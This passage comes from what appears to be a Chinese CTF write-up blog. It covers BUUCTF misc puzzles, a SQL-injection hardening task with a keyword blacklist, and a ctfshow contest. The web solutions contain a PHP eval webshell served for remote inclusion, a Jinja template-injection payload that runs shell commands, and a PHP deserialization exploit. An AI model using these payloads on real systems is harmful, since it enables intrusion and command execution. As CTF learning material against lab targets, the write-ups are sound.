class="hljs-number">2</span>)<br>        <span class="hljs-built_in">print</span> <span class="hljs-string">&#x27;&#x27;</span>.join([<span class="hljs-built_in">chr</span>(<span class="hljs-built_in">int</span>(bin_str[i:i + <span class="hljs-number">8</span>], <span class="hljs-number">2</span>)) <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> xrange(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(bin_str), <span class="hljs-number">8</span>)]) <span class="hljs-comment">#8位一组</span><br></code></pre></td></tr></table></figure>

<blockquote>
<p>flag{fazhazhenhaoting}</p>
</blockquote>
<h1 id="Mysterious"><a href="#Mysterious" class="headerlink" title="Mysterious"></a>Mysterious</h1><p>shift+f12搜索字符串，定位到主要函数处</p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/buu-misc3-1.jpg"></p>
<p>根据条件，要满足第四五六位是<code>xyz</code>，总体不能超过6位，<code>v4</code>被<code>atoi()</code>函数转为数字整型并且<code>+1</code>，所以第一个应该输入<code>122</code></p>
<p>合在一起输入<code>122xyz</code>得到flag</p>
<blockquote>
<p>flag{123_Buff3r_0v3rf|0w}</p>
</blockquote>
<h1 id="间谍启示录"><a href="#间谍启示录" class="headerlink" title="间谍启示录"></a>间谍启示录</h1><p>foremost分离iso文件，解压rar后运行flag.exe得到<code>机密文件.txt</code></p>
<blockquote>
<p>flag{379:7b758:g7dfe7f19:9464f:4g9231}</p>
</blockquote>
<h1 id="UTCTF2020-docx"><a href="#UTCTF2020-docx" class="headerlink" title="[UTCTF2020]docx"></a>[UTCTF2020]docx</h1><p>将文件后缀改为zip解压，在<code>media</code>目录下得到包含<code>flag</code>的图片</p>
<blockquote>
<p>flag{unz1p_3v3ryth1ng}</p>
</blockquote>
<h1 id="弱口令"><a href="#弱口令" class="headerlink" title="弱口令"></a>弱口令</h1><p>注释中有东西，<code>tab</code>转<code>-</code>，空格转<code>.</code>，摩斯解密得到<code>HELL0FORUM</code></p>
<p>lsb隐写，密码是<code>123456</code></p>
<p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/buu-misc3-2.png"></p>
<blockquote>
<p>flag{jsy09-wytg5-wius8}</p>
</blockquote>
<h1 id="RoarCTF2019-黄金6年"><a href="#RoarCTF2019-黄金6年" class="headerlink" title="[RoarCTF2019]黄金6年"></a>[RoarCTF2019]黄金6年</h1><p>某些书上有二维码，扫码拼接后得到<code>iwantplayctf</code></p>
<p>mp4文件结尾得到一串base64字符串，解码后得到一个rar文件</p>
<p>用二维码中的密码解压得到flag</p>
<blockquote>
<p>flag{CTF-from-RuMen-to-RuYuan}</p>
</blockquote>
<h1 id="小易的U盘"><a href="#小易的U盘" class="headerlink" title="小易的U盘"></a>小易的U盘</h1><p>foremost解压后得到一个压缩包<br>查看<code>autorun.inf</code>文件，发现指向了<code>autoflag - 副本 (32)</code><br>ida打开就是flag</p>
<blockquote>
<p>flag{29a0vkrlek3eu10ue89yug9y4r0wdu10}</p>
</blockquote>
<h1 id="WUSTCTF2020-alison-likes-jojo"><a href="#WUSTCTF2020-alison-likes-jojo" class="headerlink" title="[WUSTCTF2020]alison_likes_jojo"></a>[WUSTCTF2020]alison_likes_jojo</h1><p><code>foremost</code>分离<code>boki.jpg</code>，得到一个zip</p>
<p>爆破密码，纯数字<code>888866</code></p>
<p>txt中的内容数层base64解密得到<code>killerqueen</code></p>
<p>outguess隐写<br><code>outguess -r ../jljy.jpg -t 123.txt -k killerqueen</code></p>
<blockquote>
<p>flag{pretty_girl_alison_likes_jojo}</p>
</blockquote>
<h1 id="安洵杯-2019-吹着贝斯扫二维码"><a href="#安洵杯-2019-吹着贝斯扫二维码" class="headerlink" title="[安洵杯 2019]吹着贝斯扫二维码"></a>[安洵杯 2019]吹着贝斯扫二维码</h1><h1 id="zip"><a href="#zip" class="headerlink" title="zip"></a>zip</h1><p>下载附件，解压得到<code>68</code>个压缩包，并且每个压缩文件里都有一个<code>4</code>个字节大小的名为<code>data.txt</code>的<code>txt</code>文件，于是尝试用<code>crc32</code>碰撞还原出所有压缩包中的文件内容</p>
<p>得到<br><code>z5BzAAANAAAAAAAAAKo+egCAIwBJAAAAVAAAAAKGNKv+a2MdSR0zAwABAAAAQ01UCRUUy91BT5UkSNPoj5hFEVFBRvefHSBCfG0ruGnKnygsMyj8SBaZHxsYHY84LEZ24cXtZ01y3k1K1YJ0vpK9HwqUzb6u9z8igEr3dCCQLQAdAAAAHQAAAAJi0efVT2MdSR0wCAAgAAAAZmxhZy50eHQAsDRpZmZpeCB0aGUgZmlsZSBhbmQgZ2V0IHRoZSBmbGFnxD17AEAHAA==</code></p>
<p>解码后看到提示:<code>fix the file and get the flag</code></p>
<p>添加rar头<code>52 61 72 21 1A 07 00</code>，在注释中看到flag</p>
<blockquote>
<p>flag{nev3r_enc0de_t00_sm4ll_fil3_w1th_zip}</p>
</blockquote>
<h1 id="GUET-CTF2019-zips"><a href="#GUET-CTF2019-zips" class="headerlink" title="[GUET-CTF2019]zips"></a>[GUET-CTF2019]zips</h1><p>先纯数字爆破，得到密码<code>723456</code></p>
<p>伪加密得到<code>setup.sh</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-meta">#!/bin/bash</span><br><span class="hljs-comment">#</span><br>zip -e --password=`python -c <span class="hljs-string">&quot;print(__import__(&#x27;time&#x27;).time())&quot;</span>` flag.zip flag<br></code></pre></td></tr></table></figure>

<p>根据时间戳爆破密码得到<code>1558080832.15</code></p>
<blockquote>
<p>flag{fkjabPqnLawhvuikfhgzyffj}</p>
</blockquote>
<h1 id="从娃娃抓起"><a href="#从娃娃抓起" class="headerlink" title="从娃娃抓起"></a>从娃娃抓起</h1><p>中文电码+五笔</p>
<p>人工智能+也要从娃娃抓起</p>
<blockquote>
<p>flag{3b4b5dccd2c008fe7e2664bd1bc19292}</p>
</blockquote>
<h1 id="DDCTF2018-╯°□°）╯︵-┻━┻"><a href="#DDCTF2018-╯°□°）╯︵-┻━┻" class="headerlink" title="[DDCTF2018](╯°□°）╯︵ ┻━┻"></a>[DDCTF2018](╯°□°）╯︵ ┻━┻</h1><p>两位一组转十进制，<code>-128</code>后转为字符串</p>
<blockquote>
<p>flag{922ab9974a47cd322cf43b50610faea5}</p>
</blockquote>
]]></content>
      <categories>
        <category>wp</category>
      </categories>
      <tags>
        <tag>misc</tag>
        <tag>buu</tag>
      </tags>
  </entry>
  <entry>
    <title>【buuctf】加固题-Ezsql</title>
    <url>/buuctf/%E3%80%90buuctf%E3%80%91%E5%8A%A0%E5%9B%BA%E9%A2%98-Ezsql.html</url>
    <content><![CDATA[<p>第一次做到这种类型的题目，挺有意思的</p>
<h1 id="连接"><a href="#连接" class="headerlink" title="连接"></a>连接</h1><p>首先ssh连上靶机<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/Ezsql-1.jpg"></p>
<h1 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h1><p>进入网站根目录<code>/var/www/html</code><br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/Ezsql-2.jpg"></p>
<p>查看<code>dbConnect.php</code><br>发现只是连接数据库的<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/Ezsql-3.jpg"></p>
<p>再看<code>index.php</code><br>看到核心代码没有任何过滤<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/Ezsql-4.jpg"></p>
<h1 id="方法1"><a href="#方法1" class="headerlink" title="方法1"></a>方法1</h1><h2 id="addslashes函数"><a href="#addslashes函数" class="headerlink" title="addslashes函数"></a>addslashes函数</h2><p><code>addslashes($string)</code>：用反斜线引用字符串中的特殊字符’ “ \</p>
<h2 id="防护"><a href="#防护" class="headerlink" title="防护"></a>防护</h2><p>将username和password处理一下<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/Ezsql-5.jpg"></p>
<h1 id="方法2"><a href="#方法2" class="headerlink" title="方法2"></a>方法2</h1><h2 id="黑名单替换"><a href="#黑名单替换" class="headerlink" title="黑名单替换"></a>黑名单替换</h2><p>设置一个黑名单<br><code>$blacklist = [&quot;&gt;&quot;,&quot;;&quot;,&quot;|&quot;,&quot;union&quot;,&quot;select&quot;,&quot;or&quot;,&quot;#&quot;,&quot;--+&quot;,&quot;%&quot;,&quot;&#39;&quot;,&quot; &quot;];</code></p>
<h2 id="防护-1"><a href="#防护-1" class="headerlink" title="防护"></a>防护</h2><p><code>$username = str_replace($blacklist,&quot;&quot;,$username);</code><br><code>$password = str_replace($blacklist,&quot;&quot;,$password);</code></p>
<h1 id="check"><a href="#check" class="headerlink" title="check"></a>check</h1><p>检测通过<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/Ezsql-6.jpg"></p>
]]></content>
      <categories>
        <category>wp</category>
      </categories>
      <tags>
        <tag>buu</tag>
        <tag>sql防护</tag>
        <tag>加固</tag>
      </tags>
  </entry>
  <entry>
    <title>【ctfshow】击剑杯-wp</title>
    <url>/ctfshow/%E3%80%90ctfshow%E3%80%91%E5%87%BB%E5%89%91%E6%9D%AF-wp.html</url>
    <content><![CDATA[<h1 id="热身"><a href="#热身" class="headerlink" title="热身"></a>热身</h1><h2 id="进群得码"><a href="#进群得码" class="headerlink" title="进群得码"></a>进群得码</h2><p>群里发送 <code>击剑杯签到即可</code></p>
<h2 id="听歌识曲"><a href="#听歌识曲" class="headerlink" title="听歌识曲"></a>听歌识曲</h2><p>赛后问了群友，可能真的是积累与特征吧<br>大概有两种方法：<br>1：听歌词百度<br>2：直接知道什么歌<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E5%90%AC%E6%AD%8C%E8%AF%86%E6%9B%B2-jjb-1.png"><br>答案是普京<code>ctfshow&#123;Vladimir_Vladimirovich_Putin&#125;</code></p>
<h2 id="看图识码"><a href="#看图识码" class="headerlink" title="看图识码"></a>看图识码</h2><p>网页是一张大的二维码，但是有四个定位符就很奇怪，根据hint，分离出四个小二维码<br>用二维码神器<code>cortexscan</code>逐一扫描，然后拼接在一起，就是flag啦<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E7%9C%8B%E5%9B%BE%E8%AF%86%E7%A0%81-1.png"></p>
<h2 id="看图识妹"><a href="#看图识妹" class="headerlink" title="看图识妹"></a>看图识妹</h2><p>直接贴大佬的脚本了<br>注意要下个<code>chromedriver.exe</code><br><a href="https://chromedriver.chromium.org/home">网址</a>,版本要与chrome一致</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> time <span class="hljs-keyword">import</span> sleep<br><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> itertools<br><span class="hljs-keyword">from</span> selenium <span class="hljs-keyword">import</span> webdriver<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">force_to_get_ans</span>(<span class="hljs-params">session, url</span>):<br>    headers = &#123;<br>        <span class="hljs-string">&#x27;User-Agent&#x27;</span>: <span class="hljs-string">&#x27;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36&#x27;</span>,<br>        <span class="hljs-string">&#x27;Cookie&#x27;</span>: <span class="hljs-string">f&#x27;session=<span class="hljs-subst">&#123;session&#125;</span>&#x27;</span>&#125;<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> itertools.product([<span class="hljs-string">&#x27;A&#x27;</span>, <span class="hljs-string">&#x27;B&#x27;</span>, <span class="hljs-string">&#x27;C&#x27;</span>, <span class="hljs-string">&#x27;D&#x27;</span>, <span class="hljs-string">&#x27;E&#x27;</span>, <span class="hljs-string">&#x27;F&#x27;</span>, <span class="hljs-string">&#x27;G&#x27;</span>, <span class="hljs-string">&#x27;H&#x27;</span>, <span class="hljs-string">&#x27;I&#x27;</span>, <span class="hljs-string">&#x27;J&#x27;</span>], [<span class="hljs-built_in">str</span>(n) <span class="hljs-keyword">for</span> n <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">10</span>)]):<br>        chk = requests.post(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;url&#125;</span>/check&#x27;</span>, &#123;<span class="hljs-string">&#x27;meizi_id&#x27;</span>: <span class="hljs-string">&#x27;&#x27;</span>.join(i)&#125;, headers=headers).text<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;回答错误，轮数重新开始计算&#x27;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> chk:<br>            <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;</span>.join(i)<br><br><br>driver = webdriver.Chrome(<span class="hljs-string">r&#x27;chromedriver.exe&#x27;</span>)<br>url = <span class="hljs-string">&#x27;http://002b1a4d-e639-4e31-b149-dd0fb39d779d.challenge.ctf.show/&#x27;</span><br><br>driver.get(<span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;url&#125;</span>/start&#x27;</span>)<br>n = <span class="hljs-number">1</span><br><span class="hljs-keyword">while</span> n &lt;= <span class="hljs-number">100</span>:<br>    cke = driver.get_cookie(<span class="hljs-string">&#x27;session&#x27;</span>)<br>    ans=force_to_get_ans(cke, url)<br>    driver.find_element_by_name(<span class="hljs-string">&#x27;meizi_id&#x27;</span>).send_keys(ans)<br>    driver.find_element_by_xpath(<span class="hljs-string">&#x27;/html/body/form/p[4]/button&#x27;</span>).click()<br>    sleep(<span class="hljs-number">3</span>)<br>    n+=1s<br></code></pre></td></tr></table></figure>


<h2 id="见微知著"><a href="#见微知著" class="headerlink" title="见微知著"></a>见微知著</h2><p>远程文件包含<br>先在服务器上用flask搭建一个网页</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># coding=utf-8</span><br><br><span class="hljs-keyword">from</span> flask <span class="hljs-keyword">import</span> *<br><br>app = Flask(__name__)<br>app.secret_key = <span class="hljs-string">&#x27;*************************&#x27;</span><br><br><span class="hljs-meta">@app.route(<span class="hljs-params"><span class="hljs-string">&#x27;/&#x27;</span>,methods=[<span class="hljs-string">&#x27;GET&#x27;</span>, <span class="hljs-string">&#x27;POST&#x27;</span>]</span>)</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">index</span>():<br>    <span class="hljs-keyword">return</span> <span class="hljs-string">&quot;&lt;?php eval($_POST[1]);?&gt;&quot;</span><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    app.run(host=<span class="hljs-string">&#x27;0.0.0.0&#x27;</span>,port=<span class="hljs-number">80</span>,debug=<span class="hljs-literal">True</span>)<br></code></pre></td></tr></table></figure>
<p>运行<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E8%A7%81%E5%BE%AE%E7%9F%A5%E8%91%97-1.png"></p>
<p>上传一个<code>.user.ini</code>文件用来远程包含<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E8%A7%81%E5%BE%AE%E7%9F%A5%E8%91%97-2.png"></p>
<p>因为加了头检测，所以需要在文件前加上<code>GIF89a</code><br>在这个环境中，点也被过滤了，所以需要将ip转为数字<br><a href="http://www.jsons.cn/ipnum/">在线转换</a><br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E8%A7%81%E5%BE%AE%E7%9F%A5%E8%91%97-4.png"></p>
<p>访问upload即可远程包含<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E8%A7%81%E5%BE%AE%E7%9F%A5%E8%91%97-3.png"></p>
<h1 id="OSINT"><a href="#OSINT" class="headerlink" title="OSINT"></a>OSINT</h1><h2 id="英语阅读"><a href="#英语阅读" class="headerlink" title="英语阅读"></a>英语阅读</h2><p>OSINT的全称是<code>Open source intelligence</code><br>根据这个进行关键词搜索<br>第一篇就是<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E8%8B%B1%E8%AF%AD%E9%98%85%E8%AF%BB-1.png"><br>开头就是人名<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E8%8B%B1%E8%AF%AD%E9%98%85%E8%AF%BB-2.png"><br>flag为<code>ctfshow&#123;Bill_Donovan&#125;</code></p>
<h2 id="这是哪里"><a href="#这是哪里" class="headerlink" title="这是哪里"></a>这是哪里</h2><p>图片很大，将主要信息人物截图再百度搜图<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E8%BF%99%E6%98%AF%E5%93%AA%E9%87%8C-1.png"><br>在贴吧中得到信息<code>漳州市东山县黄道周公园</code><br>查询经纬度<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E8%BF%99%E6%98%AF%E5%93%AA%E9%87%8C-2.png"><br><code>ctfshow&#123;23.7353_117.5125&#125;</code></p>
<h2 id="卡鲁铁盒"><a href="#卡鲁铁盒" class="headerlink" title="卡鲁铁盒"></a>卡鲁铁盒</h2><p>谷歌搜图可以找到<a href="https://geckosint.medium.com/10-beginner-osint-ctf-solutions-ae89e557a4b">原题</a></p>
<p>根据题目给出的<a href="https://www.track-trace.com/">网址</a>搜索编号，找到港口和csc编号<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E5%8D%A1%E9%B2%81%E9%93%81%E7%9B%92.png"><br>注意名称全大写<br>flag:<code>ctfshow&#123;FBV854404_ROTTERDAM&#125;</code></p>
<h2 id="人家想玩嘛"><a href="#人家想玩嘛" class="headerlink" title="人家想玩嘛"></a>人家想玩嘛</h2><blockquote>
<p>ctfshow{娱乐项目名称-当地该娱乐项目票价-订票增值税}</p>
</blockquote>
<p>百度识图<br>得到位置为<code>迪拜购物中心喷泉</code><br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E4%BA%BA%E5%AE%B6%E6%83%B3%E7%8E%A9%E5%98%9B-1.png"></p>
<p>通过谷歌地图可以得知附近的景点<code>lake fountain ride</code><br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E4%BA%BA%E5%AE%B6%E6%83%B3%E7%8E%A9%E5%98%9B-2.png"></p>
<p>谷歌搜索<code>lake fountain ride 买票</code>，找到一个可能是官网的地方，标着票价<code>65</code>每人<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/random/IyKS81.png"></p>
<p>点右边的在线购票<br>得到增值税为<code>5%</code><br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E4%BA%BA%E5%AE%B6%E6%83%B3%E7%8E%A9%E5%98%9B-4.png"></p>
<p>最后的结果要将<code>fountain</code>去掉<br>flag为<code>ctfshow&#123;LAKE_RIDE-65-5%&#125;</code></p>
<h2 id="人有点多"><a href="#人有点多" class="headerlink" title="人有点多"></a>人有点多</h2><p>百度识图或者谷歌识图都可以得出地点<code>涩谷</code>，图中是涩谷的标志性街道<br>谷歌地图可以得到店铺名字<code>BIC_CAMERA</code>和电话号码后四位<code>1111</code><br>BIC_CAMERA有官网，找到线路图，可以得知最近的是<code>副都心线</code><br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E4%BA%BA%E6%9C%89%E7%82%B9%E5%A4%9A.png"></p>
<p>谷歌或者wiki里都可以得到<code>副都心线</code>的编号为<code>F16</code><br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E4%BA%BA%E6%9C%89%E7%82%B9%E5%A4%9A-1.png"></p>
<p>其实上面的线路图已经可以看出出口是<code>B2</code>了，但是这题坑就在这里，还需要在B2前加上个<code>10</code><br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E4%BA%BA%E6%9C%89%E7%82%B9%E5%A4%9A-2.png"></p>
<p>flag为<code>ctfshow&#123;BIC_CAMERA-1111-10B2-F16&#125;</code></p>
<h2 id="小城美食"><a href="#小城美食" class="headerlink" title="小城美食"></a>小城美食</h2><blockquote>
<p>flag格式：ctfshow{X省X市X区X村X号}</p>
</blockquote>
<p>百度识图<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E5%B0%8F%E5%9F%8E%E7%BE%8E%E9%A3%9F1.png"></p>
<p>关键词搜索<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E5%B0%8F%E5%9F%8E%E7%BE%8E%E9%A3%9F2.png"></p>
<p>拼接一下，得到<code>浙江省衢州市柯城区龚家埠头村28号</code><br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E5%B0%8F%E5%9F%8E%E7%BE%8E%E9%A3%9F3.png"></p>
<h2 id="安装Arch"><a href="#安装Arch" class="headerlink" title="安装Arch"></a>安装Arch</h2><blockquote>
<p>Example ctfshow{BV1GJ411x7h7}</p>
</blockquote>
<p>根据pdf中的几个关键信息，<code>白色字幕</code>，<code>虚拟机</code>，<code>安装arch</code>，在b站搜索arch安装，然后通过快速预览的方式粗滤查看，在细看<br>得到结果<br><code>BV1e3411B79M</code><br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E5%AE%89%E8%A3%85Arch-1.png"></p>
<h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="给我看看"><a href="#给我看看" class="headerlink" title="给我看看"></a>给我看看</h2><p>源码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">header</span>(<span class="hljs-string">&quot;Content-Type: text/html;charset=utf-8&quot;</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">require_once</span>(<span class="hljs-string">&quot;flag.php&quot;</span>);<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">whoami</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$name</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$your_answer</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$useless</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;name=<span class="hljs-string">&#x27;ctfshow第一深情&#x27;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;your_answer=<span class="hljs-string">&#x27;Only you know&#x27;</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;useless=<span class="hljs-string">&quot;I_love_u&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-keyword">global</span> <span class="hljs-variable">$flag</span>;<br>        <span class="hljs-keyword">global</span> <span class="hljs-variable">$you_never_know</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;name=<span class="hljs-variable">$you_never_know</span>;<br><br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;your_answer === <span class="hljs-variable language_">$this</span>-&gt;name)&#123;<br>            <span class="hljs-keyword">echo</span> <span class="hljs-variable">$flag</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$secret</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;s&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$secret</span>))&#123;<br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$secret</span>===<span class="hljs-string">&quot;给我看看!&quot;</span>)&#123;<br>        <span class="hljs-title function_ invoke__">extract</span>(<span class="hljs-variable">$_POST</span>);<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable">$secret</span>===<span class="hljs-string">&quot;给我看看!&quot;</span>)&#123;<br>            <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;&lt;script&gt;window.alert(&#x27;这是不能说的秘密&#x27;);location.href=&#x27;https://www.bilibili.com/video/BV1CW411g7UF&#x27;;&lt;/script&gt;&quot;</span>);<br>        &#125;<br>        <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$secret</span>);<br>    &#125;<br>&#125;<span class="hljs-keyword">else</span>&#123;<br>    <span class="hljs-title function_ invoke__">show_source</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure>
<p>简单的变量覆盖和反序列化<br>exp</p>
<figure class="highlight php"><table><tr><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">whoami</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$your_answer</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;your_answer=&amp;<span class="hljs-variable language_">$this</span>-&gt;name;<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">whoami</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>);<br></code></pre></td></tr></table></figure>
<p>代码使用了<code>extract</code>函数，容易构成变量覆盖<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E7%BB%99%E6%88%91%E7%9C%8B%E7%9C%8B-jj-1.png"></p>
<h2 id="谁是CTF之王？"><a href="#谁是CTF之王？" class="headerlink" title="谁是CTF之王？"></a>谁是CTF之王？</h2><p>exp</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> re<br><br>host = <span class="hljs-string">&#x27;http://cab68c18-4dae-4f19-a5c9-4c4b015acf46.challenge.ctf.show&#x27;</span><br><br>url = <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;host&#125;</span>/madlib&#x27;</span><br><br>payload = &#123;<br>        <span class="hljs-string">&quot;verb&quot;</span>:<span class="hljs-string">&quot;&#123;%set x=cycler%&#125;&quot;</span>,<br>        <span class="hljs-string">&quot;noun&quot;</span>:<span class="hljs-string">&quot;&#123;%set x=x.__init__%&#125;&quot;</span>,<br>        <span class="hljs-string">&quot;adjective&quot;</span>:<span class="hljs-string">&quot;&#123;%set x=x.__globals__&quot;</span>,<br>        <span class="hljs-string">&quot;person&quot;</span>:<span class="hljs-string">&quot;os.popen(&#x27;cat f*&#x27;)%&#125;&quot;</span>,<br>        <span class="hljs-string">&quot;place&quot;</span>:<span class="hljs-string">&quot;&#123;&#123;x.read()&#125;&#125;&quot;</span><br>        &#125;<br><br>r = requests.post(url, json=payload)<br><br>flag = re.findall(<span class="hljs-string">r&#x27;ctfshow&#123;.*&#125;&#x27;</span>, r.text)[<span class="hljs-number">0</span>]<br><br><span class="hljs-built_in">print</span>(flag)<br></code></pre></td></tr></table></figure>

<h1 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h1><h2 id="中文识别带师"><a href="#中文识别带师" class="headerlink" title="中文识别带师"></a>中文识别带师</h2><p>只有十个汉字，用鼠标写出来百度即可<br>要是再多一点就需要用到官方wp中的脚本了<br><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/%E4%B8%AD%E6%96%87%E8%AF%86%E5%88%AB%E5%B8%A6%E5%B8%88.jpg"></p>
<h1 id="CRYPTO"><a href="#CRYPTO" class="headerlink" title="CRYPTO"></a>CRYPTO</h1><h2 id="单向加密"><a href="#单向加密" class="headerlink" title="单向加密"></a>单向加密</h2><p>hint是斐波那契<br>文本中结尾的<code>=I2GWRFMO33EWUZM</code>也是hint，反转后base32解密结果为<code>fibonacci</code></p>
<p>先用脚本跑出斐波那契数列，然后与文本比较，发现是ascii码，转换一下得到flag</p>
<figure class="highlight python"><table><tr><td class="code"><pre><code class="hljs python">n=<span class="hljs-number">0</span><br>a=<span class="hljs-number">0</span><br>b=<span class="hljs-number">1</span><br>c=<span class="hljs-number">1</span><br>fs=[<span class="hljs-string">&#x27;1&#x27;</span>]<br><span class="hljs-keyword">while</span> <span class="hljs-number">1</span>:<br>	c=b+a<br>	a=b<br>	b=c<br>	<span class="hljs-keyword">if</span> n&gt;<span class="hljs-number">128</span>:<br>		<span class="hljs-keyword">break</span><br>	fs.append(<span class="hljs-built_in">str</span>(b))<br>	n=n+<span class="hljs-number">1</span><br>f=<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;code.txt&#x27;</span>)<br>d=f.read()<br>flag=[]<br>l=<span class="hljs-built_in">len</span>(fs)<br><span class="hljs-keyword">while</span> <span class="hljs-built_in">len</span>(d)!=<span class="hljs-number">0</span>:<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(l-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>,-<span class="hljs-number">1</span>):<br>        <span class="hljs-keyword">if</span> d.find(fs[i].strip())==<span class="hljs-number">0</span>:<br>            <span class="hljs-built_in">print</span>(fs[i].strip(),i+<span class="hljs-number">1</span>)<br>            flag.append(<span class="hljs-built_in">chr</span>(i+<span class="hljs-number">1</span>))<br>            d=d[<span class="hljs-built_in">len</span>(fs[i]):]<br>            <span class="hljs-keyword">break</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;&#x27;</span>.join( flag))<br></code></pre></td></tr></table></figure>

